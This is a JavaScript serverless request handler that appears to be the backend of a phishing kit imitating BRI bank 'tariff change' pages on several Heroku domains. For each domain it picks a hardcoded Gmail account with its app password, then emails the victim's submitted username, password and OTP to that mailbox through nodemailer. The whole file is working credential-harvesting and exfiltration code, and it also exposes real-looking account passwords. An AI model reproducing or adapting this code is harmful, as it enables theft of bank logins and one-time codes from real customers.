export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';
   
    if (url == 'pilihan-tarifbri-baru.herokuapp.com'){

       email = 'naldona29@gmail.com'
       pass = 'zwtjswudhjbwvcnp'
    }else
    
    if (url == 'pilih-tarifbrii.herokuapp.com'){

       email = 'bedolor677@gmail.com'
       pass = 'msbkxecpcohtiypo'
    }else
    
     if (url == 'pilih-tarif-briii.herokuapp.com'){

       email = 'asikbro788@gmail.com'
       pass = 'wrznburmmqnwvbmo'
    }else
    
    if (url == 'pilihan-tarifbri.herokuapp.com'){

       email = 'lajuga80@gmail.com'
       pass = 'rcglijclmkzofcvm'
    }else
    
     if (url == 'pilih-tarifbri-baru.herokuapp.com'){

       email = 'nianlaju21@gmail.com'
       pass = 'urquirztqttvpxlo'
    }else
    
    if (url == 'pilihan-tarif-baru.herokuapp.com'){

       email = 'lajutobo74@gmail.com'
       pass = 'bkefhkhvfllhrwpk'
    }else
    
    if (url == 'pilih-tarif-baru.herokuapp.com'){

       email = 'asaklancar011@gmail.com'
       pass = 'ugvdwsvnrxjolwlo'
    }else
    
    if (url == 'pilihan-tarif-bri.herokuapp.com'){

       email = 'mbahagia19@gmail.com'
       pass = 'bscwibbxbivxaluk'
    }else
    
    if (url == 'pilih-tarif-brii-herokuapp.com'){

       email = 'basenglah460@gmail.com'
       pass = 'wjvaeltorqzfqdcm'
    }else
    if (url == 'pilihan-tarif-bri-new.herokuapp.com'){

       email = 'landaslepas77@gmail.com'
       pass = 'eyosohykexzgicup'
    }else
    if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
    {

        email = 'suksesk541@gmail.com'; //email
        pass = 'stpqngfmwfvsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
        

    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'Welcome to the app',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li>
                        <li>password: ${body.password ?? '-'}</li>
                        <li>otp: ${body.otp ?? '-'}</li>

                    </ul>`
                ,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
